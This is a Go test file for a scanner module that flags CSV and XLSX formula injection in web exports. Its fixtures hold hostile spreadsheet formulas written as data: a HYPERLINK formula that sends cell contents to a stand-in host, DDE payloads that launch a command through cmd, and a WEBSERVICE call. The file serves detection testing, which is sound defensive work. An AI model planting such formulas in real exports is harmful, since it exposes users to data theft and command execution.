package csv_formula_injection

import (
	"archive/zip"
	"bytes"
	"fmt"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/types/severity"
)

func makeCtx(path, headers string, body []byte) *httpmsg.HttpRequestResponse {
	rawReq := []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: example.com\r\n\r\n", path))
	req := httpmsg.NewHttpRequestWithService(httpmsg.NewServiceSecure("example.com", 443, true), rawReq)
	rawResp := append([]byte(fmt.Sprintf("HTTP/1.1 200 OK\r\n%s\r\nContent-Length: %d\r\n\r\n", headers, len(body))), body...)
	return httpmsg.NewHttpRequestResponse(req, httpmsg.NewHttpResponse(rawResp))
}

func scan(t *testing.T, ctx *httpmsg.HttpRequestResponse) (sev severity.Severity, conf severity.Confidence, found bool) {
	t.Helper()
	res, err := New().ScanPerRequest(ctx, &modkit.ScanContext{})
	require.NoError(t, err)
	if len(res) == 0 {
		return 0, 0, false
	}
	require.Len(t, res, 1)
	return res[0].Info.Severity, res[0].Info.Confidence, true
}

func xlsx(t *testing.T, sheetXML string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, err := zw.Create("xl/worksheets/sheet1.xml")
	require.NoError(t, err)
	_, err = w.Write([]byte(sheetXML))
	require.NoError(t, err)
	require.NoError(t, zw.Close())
	return buf.Bytes()
}

func TestNew_Metadata(t *testing.T) {
	t.Parallel()
	m := New()
	assert.Equal(t, ModuleID, m.ID())
	assert.Contains(t, m.Tags(), "light")
	assert.Equal(t, modkit.PassiveScanScopeResponse, m.ModuleScope)
}

// TestCSV_Positive covers each flagged cell shape in a text/csv export.
func TestCSV_Positive(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name, csv string
		sev       severity.Severity
		conf      severity.Confidence
	}{
		{"canary", "name,note\nalice,\"=vgo0123456789\"\n", severity.Medium, severity.Firm},
		{"stored xss canary after tab", "name,note\nbob,\t=1+vig-sx-0123456789ab\n", severity.Medium, severity.Firm},
		{"hyperlink", "name,link\nx,\"=HYPERLINK(\"\"http://evil.example/?\"\"&A1,\"\"x\"\")\"\n", severity.Medium, severity.Tentative},
		{"dde", "a,b\n1,=cmd|' /C calc'!A0\n", severity.Medium, severity.Tentative},
		{"plus dde", "a,b\n1,+msexcel|'\\..\\calc'!A1\n", severity.Medium, severity.Tentative},
		{"generic function", "a;b\n1;@SUM(1+1)\n", severity.Low, severity.Tentative},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			sev, conf, ok := scan(t, makeCtx("/export", "Content-Type: text/csv; charset=utf-8", []byte(tc.csv)))
			require.True(t, ok)
			assert.Equal(t, tc.sev, sev)
			assert.Equal(t, tc.conf, conf)
		})
	}
}

// TestCSV_Negative: values that merely start with a trigger character, and
// apostrophe-escaped formulas, are not flagged.
func TestCSV_Negative(t *testing.T) {
	t.Parallel()
	body := "amount,phone,handle,note,escaped,heading\n" +
		"-12.50,+1 555 0100,@alice,- see (attached),'=HYPERLINK(\"http://x\"),=== Totals ===\n" +
		"=,+,-,@,'=cmd|x,ok\n"
	_, _, ok := scan(t, makeCtx("/export", "Content-Type: text/csv", []byte(body)))
	assert.False(t, ok)
}

// TestNonExport_Ignored: a formula-looking body that is not a CSV/XLSX export
// (an HTML page, an inline JSON) is out of scope.
func TestNonExport_Ignored(t *testing.T) {
	t.Parallel()
	_, _, ok := scan(t, makeCtx("/page", "Content-Type: text/html", []byte("a,b\n1,=cmd|' /C calc'!A0\n")))
	assert.False(t, ok)
	_, _, ok = scan(t, makeCtx("/x", "Content-Type: application/octet-stream\r\nContent-Disposition: inline; filename=report.csv", []byte("a\n=cmd|x\n")))
	assert.False(t, ok, "inline disposition is not an attachment")
}

// TestAttachmentDisposition: an octet-stream download named *.csv is a CSV export.
func TestAttachmentDisposition(t *testing.T) {
	t.Parallel()
	_, _, ok := scan(t, makeCtx("/download", "Content-Type: application/octet-stream\r\nContent-Disposition: attachment; filename=\"users.csv\"", []byte("a\n=cmd|' /C calc'!A0\n")))
	assert.True(t, ok)
}

func TestXLSX(t *testing.T) {
	t.Parallel()
	head := "Content-Type: application/octet-stream\r\nContent-Disposition: attachment; filename=report.xlsx"

	sev, conf, ok := scan(t, makeCtx("/r", head, xlsx(t, `<worksheet><sheetData><row><c r="A1"><f>HYPERLINK("http://x/vgo0123456789")</f></c></row></sheetData></worksheet>`)))
	require.True(t, ok)
	assert.Equal(t, severity.Medium, sev)
	assert.Equal(t, severity.Firm, conf)

	_, conf, ok = scan(t, makeCtx("/r", head, xlsx(t, `<worksheet><c><f t="normal">WEBSERVICE("http://x/"&amp;A1)</f></c></worksheet>`)))
	require.True(t, ok)
	assert.Equal(t, severity.Tentative, conf)

	// App-written SUM / HYPERLINK formulas and string cells starting with "="
	// (never evaluated) are not flagged.
	_, _, ok = scan(t, makeCtx("/r", head, xlsx(t,
		`<worksheet><c><f>SUM(A1:A3)</f></c><c><f>HYPERLINK("https://app.example/item/1")</f></c><c t="inlineStr"><is><t>=cmd|x</t></is></c></worksheet>`)))
	assert.False(t, ok)

	_, _, ok = scan(t, makeCtx("/r", head, []byte("not a zip")))
	assert.False(t, ok)
}

// TestDedupPerEndpoint: the same export URL is reported once per scan.
func TestDedupPerEndpoint(t *testing.T) {
	t.Parallel()
	mgr := dedup.NewManager()
	defer mgr.Close()
	sc := &modkit.ScanContext{DedupManager: mgr}
	m := New()
	n := 0
	for i := 0; i < 2; i++ {
		res, err := m.ScanPerRequest(makeCtx("/export", "Content-Type: text/csv", []byte("a\n=cmd|x\n")), sc)
		require.NoError(t, err)
		n += len(res)
	}
	assert.Equal(t, 1, n)
}
